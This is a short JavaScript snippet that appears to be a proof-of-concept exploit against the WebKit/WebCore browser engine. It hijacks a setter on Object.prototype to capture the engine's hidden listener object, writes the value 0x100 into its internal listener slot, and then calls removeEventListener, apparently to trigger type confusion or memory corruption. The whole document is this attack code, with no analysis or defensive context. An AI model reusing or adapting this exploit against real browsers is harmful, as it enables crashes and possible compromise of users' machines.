    propName = "WebCore::HiddenProperty::listener";
    obj = {};

    Object.prototype.__defineSetter__(propName,
        function() {
            delete Object.prototype[propName];
            hiddenObj = this
        }
    );
    addEventListener("message", obj);

    hiddenObj[propName] = 0x100;
    removeEventListener("message", obj);